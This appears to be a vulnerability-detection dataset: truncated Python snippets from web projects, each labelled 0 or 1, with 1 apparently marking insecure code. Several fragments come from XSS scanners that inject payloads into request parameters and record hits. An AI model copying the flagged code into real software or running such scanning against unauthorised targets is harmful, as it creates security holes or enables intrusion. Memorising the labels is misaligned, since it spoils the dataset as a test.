{"snippet_id": 42457, "code": "\t\t\t\tvalues=\", \".join([\"%s\"] * len(columns)) \t\t\t\t), list(d.values())) \t\texcept Exception as e: \t\t\tif e.args[0]==1062: \t\t\t\tif \"PRIMARY\" in cstr(e.args[1]): \t\t\t\t\tif self.meta.autoname==\"hash\": \t\t\t\t\t\t \t\t\t\t", "label": 0}, {"snippet_id": 21665, "code": "?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id>[0-9]+)/delete$', 'course_groups.views.remove_user_from_cohort', name=\"remove_from_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts", "label": 0}, {"snippet_id": 43207, "code": "[1] or None \t\t\tif df and df.fieldtype in type_map and column_type in column_types_to_check_length: \t\t\t\tmax_length=cint(df.get(\"length\")) or cint(default_column_max_length) \t\t\t\tif len(cstr(value)) > max_length", "label": 0}, {"snippet_id": 33507, "code": "(WebsiteGenerator): \twebsite=frappe._dict( \t\torder_by=\"published_on desc\" \t) \tdef make_route(self): \t\tif not self.route: \t\t\treturn frappe.db.get_value('Blog Category', self.blog_category, \t\t\t\t'route') ", "label": 0}, {"snippet_id": 3436, "code": ", \"req_headers\": headers, \"req_body\":body, \"res_headers\": xss_request_url.headers,\"res_body\": xss_request_url.text} dbupdate.insert_record(attack_result) result=True xss_request_uri=req.api_request(parsed_url", "label": 0}, {"snippet_id": 53039, "code": "): return edit_coordinator(request) @check_document_modify_permission() def save_coordinator(request): response={'status': -1} coordinator_data=json.loads(request.POST.get('coordinator', '{}')) if coordinator_data", "label": 0}, {"snippet_id": 8157, "code": "'ENABLE_DJANGO_ADMIN_SITE'): urlpatterns +=(url(r'^admin/', include(admin.site.urls)),) if settings.MITX_FEATURES.get('AUTH_USE_OPENID'): urlpatterns +=( url(r'^openid/login/$', 'django_openid_auth.views", "label": 0}, {"snippet_id": 3079, "code": ") return payload_list def check_xss_impact(res_headers): print \"response header\",res_headers['Content-Type'] if res_headers['Content-Type']: if res_headers['Content-Type'].find('application/json') !=-1", "label": 0}, {"snippet_id": 28154, "code": ".value) \trole=sql.get_user_role_by_uuid(user_id.value) except: \tpass hap_configs_dir=funct.get_config_var('configs', 'haproxy_save_configs_dir') if serv is not None: \tcfg=hap_configs_dir +serv +\"-\" +funct", "label": 0}, {"snippet_id": 40601, "code": " is_print_hide(self, fieldname, df=None, for_print=True): \t\t\"\"\"Returns true if fieldname is to be hidden for print. \t\tPrint Hide can be set via the Print Format Builder or in the controller as a list \t", "label": 0}, {"snippet_id": 32054, "code": "\"ajax-modal\",) icon=\"plus\" policy_rules=((\"identity\", \"identity:create_mapping\"),) class EditMappingLink(tables.LinkAction): name=\"edit\" verbose_name=_(\"Edit\") url=\"horizon:identity:mappings:update\" classes", "label": 0}, {"snippet_id": 2924, "code": " decoded_payload=xss_payload_decode(payload) print decoded_payload print xss_url if xss_request.text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable", "label": 0}, {"snippet_id": 27557, "code": " Handler(webapp2.RequestHandler): \"\"\"A superclass for all handlers. It contains many convenient methods.\"\"\" def is_cron(self): \"\"\"Return true if the request is from a cron job.\"\"\" return bool(self.request", "label": 0}, {"snippet_id": 20394, "code": ".imports_dir: self.should_fetch_course=False else: self.should_fetch_course=kwargs.get('should_fetch_course') self.imports_dir=path('test_root/courses/') self.pa11y_report_dir=os.path.join(self.report_dir", "label": 0}, {"snippet_id": 49994, "code": ".utils.ansi import parse_ansi from evennia.utils import utils from evennia.utils.text2html import parse_html from evennia.server import session _CLIENT_SESSIONS=utils.mod_import(settings.SESSION_ENGINE", "label": 0}, {"snippet_id": 9210, "code": " url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index", "label": 1}, {"snippet_id": 10482, "code": "'pa11ycrawler run{start_urls} ' '--pa11ycrawler-allowed-domains=localhost ' '--pa11ycrawler-reports-dir={report_dir} ' '--pa11ycrawler-deny-url-matcher=logout ' '--pa11y-reporter=\"1.0-json\" ' '--depth-limit=6 ' )", "label": 0}, {"snippet_id": 36069, "code": "(fieldname)): \t\t\treturn self.get(fieldname) \t\treturn get_decrypted_password(self.doctype, self.name, fieldname, raise_exception=raise_exception) \tdef is_dummy_password(self, pwd): \t\treturn ''.join(set(pwd))==", "label": 0}, {"snippet_id": 49362, "code": ", object): def __init__(self, field_name, label, value, query_params): self.field_name=field_name self.label=label self.value=value self.query_params=query_params def get_title(self): return self.label", "label": 0}, {"snippet_id": 10877, "code": ".wait_for_test_servers() try: CourseFixture('foobar_org', '1117', 'seed_forum', 'seed_foo').install() print 'Forums permissions/roles data has been seeded' except FixtureError: pass if self.serversonly: self", "label": 0}, {"snippet_id": 19864, "code": " self.report_dir=kwargs.get('report_dir', Env.BOK_CHOY_REPORT_DIR) self.xunit_report=self.report_dir / \"xunit.xml\" self.cache=Env.BOK_CHOY_CACHE self.fasttest=kwargs.get('fasttest', False) self.serversonly", "label": 0}, {"snippet_id": 39301, "code": ".name: \t\t\t \t\t\tset_new_name(self) \t\tif not self.creation: \t\t\tself.creation=self.modified=now() \t\t\tself.created_by=self.modifield_by=frappe.session.user \t\td=self.get_valid_dict(convert_dates_to_str=True)", "label": 0}, {"snippet_id": 33187, "code": "/v1/builds/%s' % build_id return self.redirect(api_path) class ViewBuildHandler(auth.AuthenticatingHandler): \"\"\"Redirects to API explorer to see the build.\"\"\" @auth.public def get(self, build_id): try:", "label": 0}, {"snippet_id": 54923, "code": "=set() for translated_resource in translated_resources: projects.add(translated_resource.resource.project) translated_resource.calculate_stats(save=False) bulk_update(translated_resources, update_fields", "label": 0}, {"snippet_id": 36179, "code": "\tself._precision[cache_key][fieldname]=get_field_precision(df, self) \t\treturn self._precision[cache_key][fieldname] \tdef get_formatted(self, fieldname, doc=None, currency=None, absolute_value=False, translated", "label": 0}, {"snippet_id": 20108, "code": "), \"--verbosity={}\".format(self.verbosity), ] return \" \".join(substring) def prepare_bokchoy_run(self): \"\"\" Sets up and starts servers for a Bok Choy run. If --fasttest is not specified then static assets", "label": 0}, {"snippet_id": 45393, "code": "']) for param in params_form.cleaned_data]) job_id=_submit_coordinator(request, coordinator, mapping) request.info(_('Coordinator submitted.')) return redirect(reverse('oozie:list_oozie_coordinator', kwargs", "label": 0}, {"snippet_id": 41067, "code": "=global_date_format(self.published_on) \t\tif self.blogger: \t\t\tcontext.blogger_info=frappe.get_doc(\"Blogger\", self.blogger).as_dict() \t\tcontext.description=self.blog_intro or self.content[:140] \t\tcontext", "label": 0}, {"snippet_id": 42288, "code": ".doctype]=valid \t\treturn frappe.local.valid_columns[self.doctype] \tdef is_new(self): \t\treturn self.get(\"__islocal\") \tdef as_dict(self, no_nulls=False, no_default_fields=False, convert_dates_to_str=False", "label": 0}, {"snippet_id": 22761, "code": "\"course_root\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/info$', 'courseware.views.course_info', name=\"info\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/syllabus$', 'courseware.views.syllabus', name=", "label": 0}, {"snippet_id": 41312, "code": "\t\t\twhere `tabBlog Post`.blog_category=`tabBlog Category`.name and published=1) \t\torder by title asc\"\"\", as_dict=1) def clear_blog_cache(): \tfor blog in frappe.db.sql_list(\"\"\"select route from \t\t`tabBlog", "label": 0}, {"snippet_id": 34817, "code": "\"): \t\t\t\tfrom frappe.model.meta import get_table_columns \t\t\t\tvalid=get_table_columns(self.doctype) \t\t\telse: \t\t\t\tvalid=self.meta.get_valid_columns() \t\t\tfrappe.local.valid_columns[self.doctype]=valid \t\treturn", "label": 0}, {"snippet_id": 49974, "code": " import server, resource from twisted.internet.task import LoopingCall from django.utils.functional import Promise from django.utils.encoding import force_unicode from django.conf import settings from evennia", "label": 0}, {"snippet_id": 6819, "code": "\" Disallow login for a user after N failures in a given month. This is said to be an imminent Kantara requirement. \"\"\" return self.config.getint(self.section, 'max_authn_failures_per_month') @property def", "label": 0}, {"snippet_id": 50574, "code": "(request) elif dmode=='input': return self.mode_input(request) elif dmode=='receive': return self.mode_receive(request) elif dmode=='close': return self.mode_close(request) elif dmode=='keepalive': return", "label": 0}, {"snippet_id": 46042, "code": ": collection_doc.can_read_or_exception(request.user) else: collection_doc.doc.get().can_read_or_exception(request.user) collection=Collection2(request.user, document=collection_doc) except Exception, e", "label": 0}, {"snippet_id": 23931, "code": " def test_test_dir(self): test_dir='foo' suite=BokChoyTestSuite('', test_dir=test_dir) self.assertEqual( suite.cmd, self._expected_command(name=test_dir) ) def test_verbosity_settings_1_process(self): ", "label": 0}, {"snippet_id": 9449, "code": "(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_flagged_problems/take_action_on_flags$', 'open_ended_grading.views.take_action_on_flags', name='open_ended_flagged_problems_take_action'), url(r'^courses/(?P", "label": 0}, {"snippet_id": 20917, "code": ".MITX_FEATURES[\"USE_CUSTOM_THEME\"]: urlpatterns +=( url(r'^jobs$', 'static_template_view.views.render', {'template': 'jobs.html'}, name=\"jobs\"), url(r'^press$', 'student.views.press', name=\"press\"), url(r", "label": 0}, {"snippet_id": 24506, "code": "() self.log_dir.makedirs_p() self.har_dir.makedirs_p() self.report_dir.makedirs_p() test_utils.clean_reports_dir() if not(self.fasttest or self.skip_clean or self.testsonly): test_utils.clean_test_files", "label": 0}, {"snippet_id": 40480, "code": "\tif not hasattr(self, \"_precision\"): \t\t\tself._precision=frappe._dict() \t\tif cache_key not in self._precision: \t\t\tself._precision[cache_key]=frappe._dict() \t\tif fieldname not in self._precision[cache_key", "label": 0}, {"snippet_id": 41803, "code": "\treturn frappe.db.get_value(self.doctype, self.name, key) \tdef get(self, key=None, filters=None, limit=None, default=None): \t\tif key: \t\t\tif isinstance(key, dict): \t\t\t\treturn _filter(self.get_all_children", "label": 0}, {"snippet_id": 15488, "code": "./manage.py lms --settings bok_choy flush --traceback --noinput\") bokchoy_utils.clear_mongo() def verbosity_processes_string(self): \"\"\" Multiprocessing, xunit, color, and verbosity do not work well together", "label": 0}, {"snippet_id": 41788, "code": " not None) and(key not in self.dont_update_if_missing): \t\t\t\tself.set(key, value) \tdef get_db_value(self, key): \t\treturn frappe.db.get_value(self.doctype, self.name, key) \tdef get(self, key=None, filters", "label": 0}, {"snippet_id": 53830, "code": "\"http://www1.search-results.com/web?q=\" +user_dork +\"&page=\" +str(page)) parser=BeautifulSoup(send.data, features=\"lxml\") for link in parser.find_all('cite'): result=link.string x=str(input(\"[Input Script", "label": 1}, {"snippet_id": 30664, "code": " -%s %s %s\" %(log_path +viewlog, date, date1, rows, grep_act, grep) \toutput, stderr=funct.subprocess_execute(cmd) \tfunct.show_log(output) \tprint(stderr) \t\t if serv is not None and act==\"showMap\": \tovw.get_map", "label": 0}, {"snippet_id": 51698, "code": " LANGUAGE_COOKIE_NAME='dashboard_language' STATIC_URL='/static/' if DEBUG: STATIC_ROOT='static' else: STATIC_ROOT='/srv/dashboard/static/' JET_SIDE_MENU_ITEMS=[ {'label': _('\ud83d\udd27 Configuration'), 'items':", "label": 1}, {"snippet_id": 39146, "code": "\t\tself.__dict__[key]=None \tdef get_valid_columns(self): \t\tif self.doctype not in frappe.local.valid_columns: \t\t\tif self.doctype in(\"DocField\", \"DocPerm\") and self.parent in(\"DocType\", \"DocField\", \"DocPerm", "label": 0}, {"snippet_id": 2279, "code": "=parsed_url.scheme+\"://\"+parsed_url.netloc+parsed_url.path+\"/?\"+parsed_url.query.replace(value[0], payload) xss_request=req.api_request(xss_url,\"GET\",headers) decoded_payload=xss_payload_decode(payload) print", "label": 0}, {"snippet_id": 12746, "code": ", url(r'^openid/logo.gif$', 'django_openid_auth.views.logo', name='openid-logo'), ) if settings.MITX_FEATURES.get('AUTH_USE_SHIB'): urlpatterns +=( url(r'^shib-login/$', 'external_auth.views.shib_login", "label": 0}, {"snippet_id": 35849, "code": "\t\t\t\t\tself_value=len(self.get(key)) \t\t\t\t\tdb_value=len(db_value) \t\t\t\telse: \t\t\t\t\tself_value=self.get_value(key) \t\t\t\tif self_value !=db_value: \t\t\t\t\tfrappe.throw(_(\"Not allowed to change{0} after submission", "label": 0}, {"snippet_id": 28632, "code": " use alerting at this servers group\") \t\tsys.exit() \t def check_login(**kwargs): \timport sql \timport http.cookies \tcookie=http.cookies.SimpleCookie(os.environ.get(\"HTTP_COOKIE\")) \tuser_uuid=cookie.get('uuid", "label": 0}, {"snippet_id": 28718, "code": ") \t\t \tif level is None: \t\tlevel=1 \t\t \ttry: \t\treturn True if role <=level else False \texcept: \t\treturn False \t\tpass def page_for_admin(**kwargs): \tgive_level=1 \tgive_level=kwargs.get(\"level\") \t\t \tif not", "label": 1}, {"snippet_id": 11489, "code": " one_time_startup import django.contrib.auth.views if settings.DEBUG or settings.MITX_FEATURES.get('ENABLE_DJANGO_ADMIN_SITE'): admin.autodiscover() urlpatterns=('', url(r'^update_certificate$', 'certificates.views", "label": 0}, {"snippet_id": 24639, "code": " and verbosity. Quitting' raise BuildFailure(msg) if self.num_processes !=1: substring=[ \"--with-xunitmp --xunitmp-file={}\".format(self.xunit_report), \"--processes={}\".format(self.num_processes), \"--no", "label": 0}, {"snippet_id": 1606, "code": "'scanid']: if data['scanid'] not in scanids: scanids.append({\"scanid\": data['scanid'], \"name\": data['name'], \"url\": data['url']}) except: pass return jsonify(scanids) def fetch_records(scanid): vul_list=", "label": 0}, {"snippet_id": 36995, "code": "\"writers\") def get_blog_category(route): \treturn frappe.db.get_value(\"Blog Category\",{\"name\": route}, \"title\") or route def get_blog_list(doctype, txt=None, filters=None, limit_start=0, limit_page_length", "label": 0}, {"snippet_id": 1027, "code": "\",key) xss_payloads=fetch_xss_payload() for payload in xss_payloads: if result is not True: print \"param to test\",key parsed_url=urlparse.urlparse(url) xss_url=parsed_url.scheme+\"://\"+parsed_url.netloc", "label": 1}, {"snippet_id": 52121, "code": " api=get_oozie(request.user) credentials=Credentials() try: credentials.fetch(api) except Exception, e: LOG.error(smart_str(e)) return render('editor/workflow_editor.mako', request,{ 'layout_json': json", "label": 1}, {"snippet_id": 32017, "code": "[entry for dn, entry in result if isinstance(entry, dict)] \t\ttry: \t\t\tprint('[\"'+results[0][ldap_search_field][0].decode(\"utf-8\")+'\",\"'+domain+'\"]') \t\texcept: \t\t\tprint('error: user not found') \tfinally:", "label": 0}, {"snippet_id": 43902, "code": " \t\tval=self.get(fieldname) \t\treturn self.cast(val, df) \tdef cast(self, value, df): \t\treturn cast_fieldtype(df.fieldtype, value) \tdef _extract_images_from_text_editor(self): \t\tfrom frappe.utils.file_manager", "label": 0}, {"snippet_id": 32870, "code": "._WriteTemplate('header.html') self.wfile.write('<div class=\"doc\">') self.wfile.write('<div class=\"Breadcrumbs\">\\n') self.wfile.write('<a class=\"Breadcrumbs-crumb\">%s</a>\\n' % self.path) self.wfile.write(", "label": 1}, {"snippet_id": 18078, "code": "'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/jump_to/(?P<location>.*)$', 'courseware.views.jump_to', name=\"jump_to\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/modx/(?P<location>.*?)/(?P<dispatch>[^/]*)$'", "label": 0}, {"snippet_id": 1884, "code": " in body.items(): xss_payloads=fetch_xss_payload() for payload in xss_payloads: temp_body.update(body) temp_body[key]=payload print \"updated body\",temp_body xss_post_request=req.api_request(url, \"POST\",", "label": 0}, {"snippet_id": 9641, "code": "[^/]+)/(?P<tab_slug>[^/]+)/$', 'courseware.views.static_tab', name=\"static_tab\"), ) if settings.MITX_FEATURES.get('ENABLE_STUDENT_HISTORY_VIEW'): urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]", "label": 0}, {"snippet_id": 17458, "code": ", 'lms_migration.migrate.gitreload'), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$', 'track.views.view_tracking_log'), url(r'^event_logs/(?P<args>.+)$", "label": 0}, {"snippet_id": 14430, "code": "), ) if settings.MITX_FEATURES.get('ENABLE_SQL_TRACKING_LOGS'): urlpatterns +=( url(r'^event_logs$', 'track.views.view_tracking_log'), url(r'^event_logs/(?P<args>.+)$', 'track.views.view_tracking_log')", "label": 0}, {"snippet_id": 27722, "code": ".write(template.render(values)) self.response.set_status(status) def before_render_json(self, values, status): \"\"\"A hook for modifying values before render_json.\"\"\" def render_json(self, values, status=200)", "label": 0}, {"snippet_id": 10686, "code": " set, specifies test files, classes, cases, etc. See platform doc. default_store -modulestore to use when running tests(split or draft) num_processes -number of processes or threads to use in tests. Recommendation", "label": 0}, {"snippet_id": 21758, "code": " urlpatterns +=( url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/news$', 'courseware.views.news', name=\"news\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/discussion/', include('django_comment_client.urls", "label": 0}, {"snippet_id": 13105, "code": "'^event$', 'track.views.user_track'), url(r'^t/(?P<template>[^/]*)$', 'static_template_view.views.index'), url(r'^accounts/login$', 'student.views.accounts_login', name=\"accounts_login\"), url(r'^login_ajax$", "label": 0}, {"snippet_id": 161, "code": "\"res_headers\": xss_request.headers,\"res_body\": xss_request.text} dbupdate.insert_record(attack_result) result=True uri_check_list=['?', '&', '=', '%3F', '%26', '%3D'] for uri_list in uri_check_list: if", "label": 0}, {"snippet_id": 34595, "code": "])(value) \t\t\tvalue.init_valid_columns() \t\tvalue.parent=self.name \t\tvalue.parenttype=self.doctype \t\tvalue.parentfield=key \t\tif value.docstatus is None: \t\t\tvalue.docstatus=0 \t\tif not getattr(value, \"idx\"", "label": 0}, {"snippet_id": 2307, "code": ".text.find(decoded_payload) !=-1: impact=check_xss_impact(xss_request.headers) logs.logging.info(\"%s is vulnerable to XSS\",url) print \"%s[{0}]{1} is vulnerable to XSS%s\".format(impact,url)%(api_logger.G", "label": 0}, {"snippet_id": 6821, "code": " for a user after N failures in a given month. This is said to be an imminent Kantara requirement. \"\"\" return self.config.getint(self.section, 'max_authn_failures_per_month') @property def login_state_ttl", "label": 0}, {"snippet_id": 19077, "code": " ) urlpatterns=patterns(*urlpatterns) if settings.DEBUG: urlpatterns +=static(settings.STATIC_URL, document_root=settings.STATIC_ROOT) handler404='static_template_view.views.render_404' handler500='static_template_view", "label": 0}, {"snippet_id": 52636, "code": ".union(set(find_dollar_braced_variables(data))) elif node_data['type']=='pig': parameters=parameters.union(set(find_dollar_variables(data))) response['status']=0 response['parameters']=list(parameters)", "label": 0}, {"snippet_id": 26327, "code": "('VAT ID checking failed for country{}'.format(data.get('country'))) self.instance.vat_id_validated=False if self.request and self.vat_warning: messages.warning(self.request, _('Your VAT ID could not be", "label": 0}, {"snippet_id": 36642, "code": "\t\treturn self.title \tdef validate(self): \t\tsuper(BlogPost, self).validate() \t\tif not self.blog_intro: \t\t\tself.blog_intro=self.content[:140] \t\t\tself.blog_intro=strip_html_tags(self.blog_intro) \t\tif self", "label": 0}, {"snippet_id": 40204, "code": "\t\telse: \t\t\t\t\tself_value=self.get_value(key) \t\t\t\tif self_value !=db_value: \t\t\t\t\tfrappe.throw(_(\"Not allowed to change{0} after submission\").format(df.label), \t\t\t\t\t\tfrappe.UpdateAfterSubmitError) \tdef _sanitize_content", "label": 0}, {"snippet_id": 22310, "code": ".contrib.auth.views.password_change_done, name='auth_password_change_done'), url(r'^password_reset_confirm/(?P<uidb36>[0-9A-Za-z]+)-(?P<token>.+)/$', 'student.views.password_reset_confirm_wrapper', name", "label": 0}, {"snippet_id": 50327, "code": "{'msg': host_string, 'csessid': csessid}) def mode_keepalive(self, request): \"\"\" This is called by render_POST when the client is replying to the keepalive. \"\"\" csessid=request.args.get('csessid')[0] self", "label": 0}, {"snippet_id": 30844, "code": "\tleft=form.getvalue('left') \tright=form.getvalue('right') \thap_configs_dir=funct.get_config_var('configs', 'haproxy_save_configs_dir') \tcmd='diff -ub %s%s %s%s' %(hap_configs_dir, left, hap_configs_dir,", "label": 0}, {"snippet_id": 20156, "code": " bokchoy_utils.start_servers(self.default_store, self.coveragerc) def load_courses(self): \"\"\" Loads courses from self.imports_dir. Note: self.imports_dir is the directory that contains the directories that have", "label": 0}, {"snippet_id": 41875, "code": " value \t\telse: \t\t\treturn self.__dict__ \tdef getone(self, key, filters=None): \t\treturn self.get(key, filters=filters, limit=1)[0] \tdef set(self, key, value, as_value=False): \t\tif isinstance(value, list)", "label": 0}, {"snippet_id": 629, "code": " xss_result=True xss_request_uri=req.api_request(parsed_url+'/?test='+payload,\"GET\",headers) if xss_request_url.text.find(payload) !=-1: impact=check_xss_impact() xss_result=True if xss_result is True: print \"%s", "label": 1}, {"snippet_id": 27084, "code": " is VULNERABLE\" print \"Url: \" +url print \"Parameters: %s\\n\" % str(post_params) return return def scan_for_forms(fname, host, url): print \"[+] Start scan\" rtype=\"\" has_form=0 params=[] hidden_param_name=", "label": 1}, {"snippet_id": 17779, "code": "'^password_reset_done/$', django.contrib.auth.views.password_reset_done, name='auth_password_reset_done'), url(r'^heartbeat$', include('heartbeat.urls')), ) if not settings.MITX_FEATURES[\"USE_CUSTOM_THEME", "label": 0}, {"snippet_id": 11721, "code": "(?i)university_profile/McGillX$', 'courseware.views.static_university_profile', name=\"static_university_profile\", kwargs={'org_id': 'McGillX'}), url(r'^(?i)university_profile/TorontoX$', 'courseware.views", "label": 0}, {"snippet_id": 29459, "code": " firewall-cmd --reload') \treturn firewalld_commands \t def check_haproxy_config(serv): \timport sql \tcommands=[ \"haproxy -q -c -f %s\" % sql.get_setting('haproxy_config_path')] \tssh=ssh_connect(serv) \tfor", "label": 0}, {"snippet_id": 47641, "code": "=0, maximum=4)) f.add_content(PlainText('Notes:<br/>')) f.add_content(TextArea(name='notes', placeholder=\"Hier k\u00f6nnte ihre Werbung stehen\")) if profile: f.add_content(PlainText('<br /><br />Change password", "label": 0}, {"snippet_id": 46315, "code": "{\"size\":12,\"name\":\"Grid Results\",\"id\":\"52f07188-f30f-1296-2450-f77e02e1a5c0\",\"widgetType\":\"resultset-widget\", \"properties\":{},\"offset\":0,\"isLoading\":True,\"klass\":\"card card-widget span12\"}]}], \"drops\":", "label": 0}, {"snippet_id": 40303, "code": " Text\") and df.get(\"options\")==\"Email\": \t\t\t\tsanitized_value=sanitize_email(value) \t\t\telif df and(df.get(\"ignore_xss_filter\") \t\t\t\t\t\tor(df.get(\"fieldtype\")==\"Code\" and df.get(\"options\")!=\"Email\") \t\t\t\t\t\tor", "label": 1}, {"snippet_id": 32228, "code": "(0, os.path.join(SRC_DIR, 'third_party', 'Python-Markdown')) import markdown def main(argv): parser=argparse.ArgumentParser(prog='md_browser') parser.add_argument('-p', '--port', type=int, default=8080", "label": 0}, {"snippet_id": 37120, "code": "\tlimit %(start)s, %(page_len)s\"\"\" %{ \t\t\t\"start\": limit_start, \"page_len\": limit_page_length, \t\t\t\t\"condition\":(\" and \" +\" and \".join(conditions)) if conditions else \"\" \t\t} \tposts=frappe.db.sql(query, as_dict", "label": 0}, {"snippet_id": 24739, "code": " example, if the course is located in `test_root/courses/test-example-course/`, self.imports_dir should be `test_root/courses/`. \"\"\" msg=colorize('green', \"Importing courses from{}...\".format(self.imports_dir", "label": 0}, {"snippet_id": 47734, "code": " pw1.islower(): return False return True def recreate_form(reason: str): return redirect('/admin/users/edit?fault=' +str(reason)) def action_save_user(request: HttpRequest, default_forward_url: str=\"/admin", "label": 0}, {"snippet_id": 52891, "code": " raise PopupException(_(\"Error submitting workflow %s\") %(workflow,), detail=detail) return redirect(reverse('oozie:list_oozie_workflow', kwargs={'job_id': job_id})) def list_editor_coordinators(request)", "label": 0}, {"snippet_id": 47163, "code": " from __future__ import absolute_import, print_function import uuid from flask import url_for from flask_admin import Admin, menu from mock import patch from sqlalchemy.exc import SQLAlchemyError from invenio_records", "label": 0}, {"snippet_id": 21690, "code": " url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/open_ended_notifications$', 'open_ended_grading.views.combined_notifications', name='open_ended_notifications'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/", "label": 0}, {"snippet_id": 30084, "code": " \t\tfunct.upload(serv, cert_path, name) \texcept: \t\tpass \t \tos.system(\"mv %s %s\" %(name, cert_local_dir)) \tfunct.logging(serv, \"add.py \t if form.getvalue('backend') is not None: \tfunct.show_backends(serv", "label": 0}, {"snippet_id": 33536, "code": " \tdef validate(self): \t\tsuper(BlogPost, self).validate() \t\tif not self.blog_intro: \t\t\tself.blog_intro=self.content[:140] \t\t\tself.blog_intro=strip_html_tags(self.blog_intro) \t\tif self.blog_intro: \t\t\tself", "label": 0}, {"snippet_id": 24538, "code": ".testsonly: self.prepare_bokchoy_run() else: self.load_data() msg=colorize('green', \"Confirming servers have started...\") print msg bokchoy_utils.wait_for_test_servers() try: CourseFixture('foobar_org', '1117'", "label": 0}, {"snippet_id": 10973, "code": ": substring=[ \"--with-xunitmp --xunitmp-file={}\".format(self.xunit_report), \"--processes={}\".format(self.num_processes), \"--no-color --process-timeout=1200\" ] else: substring=[ \"--with-xunit\", \"--xunit", "label": 0}, {"snippet_id": 9001, "code": "<userid>[^/]*)/(?P<mod_id>.*?)/(?P<dispatch>[^/]*)$', 'courseware.module_render.xqueue_callback', name='xqueue_callback'), url(r'^change_setting$', 'student.views.change_setting', name='change_setting'), url", "label": 0}, {"snippet_id": 52600, "code": "'properties',{}).get('script_path',{}) if script_path: script_path=script_path.replace('hdfs://', '') if request.fs.do_as_user(request.user, request.fs.exists, script_path): data=request.fs.do_as_user(request", "label": 0}, {"snippet_id": 27452, "code": " avoid XSS).\"\"\" return base64.b64encode(json.dumps(value, cls=JsonEncoder)) _JINJA_ENVIRONMENT=jinja2.Environment( loader=jinja2.FileSystemLoader( os.path.join(os.path.dirname(__file__), '..', 'templates'", "label": 0}, {"snippet_id": 16791, "code": "]*)/chapter/(?P<chapter>[^/]*)/(?P<page>[^/]*)$', 'staticbook.views.pdf_index'), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/htmlbook/(?P<book_index>[^/]*)/$', 'staticbook.views.html_index', name=\"html_book", "label": 1}, {"snippet_id": 20094, "code": "(self.xunit_report), \"--processes={}\".format(self.num_processes), \"--no-color --process-timeout=1200\" ] else: substring=[ \"--with-xunit\", \"--xunit-file={}\".format(self.xunit_report), \"--verbosity={}\".format", "label": 0}, {"snippet_id": 53488, "code": "=dependencies bundle_doc.update_data(bundle_data) bundle_doc.name=bundle_data['name'] bundle_doc.save() response['status']=0 response['id']=bundle_doc.id response['message']=_('Saved !') return HttpResponse(json", "label": 0}, {"snippet_id": 41584, "code": " load_doctype_module from frappe.model import display_fieldtypes from frappe.model.db_schema import type_map, varchar_len from frappe.utils.password import get_decrypted_password, set_encrypted_password", "label": 0}, {"snippet_id": 9471, "code": "+)/cohorts$', 'course_groups.views.list_cohorts', name=\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort\"), url(r'^courses/(?P", "label": 0}, {"snippet_id": 54133, "code": ":%S\"),int(time.time()-ti))) print(\"=\"*25) stop=False def scan(): sc().start() class ki(threading.Thread): def run(self): global stop stop=True def kill(): ki().start() main=Tk() main.title(\"XSS Sonar\")", "label": 0}, {"snippet_id": 7949, "code": "', name=\"cohorts\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/add$', 'course_groups.views.add_cohort', name=\"add_cohort\"), url(r'^courses/(?P<course_id>[^/]+/[^/]+/[^/]+)/cohorts/(?P<cohort_id", "label": 0}, {"snippet_id": 28951, "code": "'log_path') \tdiff=\"\" \tdate=get_data('date_in_log') \tcmd=\"/bin/diff -ub %s %s\" %(oldcfg, cfg) \t \toutput, stderr=subprocess_execute(cmd) \t \tfor line in output: \t\tdiff +=date +\" \" +line +\"\\n\" \ttry:\t\t \t\tlog=open", "label": 0}, {"snippet_id": 50251, "code": " is called by render_POST when the client requests an init mode operation(at startup) Args: request(Request): Incoming request. \"\"\" csessid=request.args.get('csessid')[0] remote_addr=request.getClientIP(", "label": 1}, {"snippet_id": 41139, "code": "\t\t\tcontext.comment_text=_('{0} comments').format(len(context.comment_list)) \t\tcontext.category=frappe.db.get_value(\"Blog Category\", \t\t\tcontext.doc.blog_category,[\"title\", \"route\"], as_dict=1) \t\tcontext", "label": 0}, {"snippet_id": 42059, "code": ".parenttype=self.doctype \t\tvalue.parentfield=key \t\tif value.docstatus is None: \t\t\tvalue.docstatus=0 \t\tif not getattr(value, \"idx\", None): \t\t\tvalue.idx=len(self.get(key) or[]) +1 \t\tif not getattr(value, ", "label": 0}, {"snippet_id": 34470, "code": ": \t\tif value==None: \t\t\tvalue={} \t\tif isinstance(value,(dict, BaseDocument)): \t\t\tif not self.__dict__.get(key): \t\t\t\tself.__dict__[key]=[] \t\t\tvalue=self._init_child(value, key) \t\t\tself.__dict__[key].append", "label": 0}, {"snippet_id": 49650, "code": " iterable in which: -first element is name of the field(string) or callable which returns html -label for the column(string) \"\"\" if not self.list_display: return[SmartColumn(self.model, '__str__', 1, self", "label": 0}, {"snippet_id": 16023, "code": "' '--depth-limit={depth} ' ).format( start_urls=' '.join(self.start_urls), allowed_domains='localhost', report_dir=self.pa11y_report_dir, reporter=\"1.0-json\", dont_go_here=\"logout\", depth=\"6\", ) return", "label": 0}, {"snippet_id": 42163, "code": " float): \t\t\t\t\td[fieldname]=flt(d[fieldname]) \t\t\t\telif df.fieldtype in(\"Datetime\", \"Date\", 